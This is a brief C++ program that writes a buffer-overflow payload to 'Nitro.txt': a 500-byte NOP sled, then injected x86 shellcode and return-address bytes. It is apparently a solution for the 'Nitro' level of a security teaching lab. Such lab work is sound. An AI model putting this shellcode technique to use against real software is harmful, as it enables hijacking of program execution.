#include <stdio.h>
#include <fstream>

    std::ofstream out("Nitro.txt");
int main()
{
    for(int i=1;i<=500;i++)
        out<<"90 ";
    out<<"b8 4d 5f d7 51 8d 6c 24 18 83 ec 04 c7 04 24 fd 8c 04 08 c3 30 30 68 55 10 2f 68 55";
}
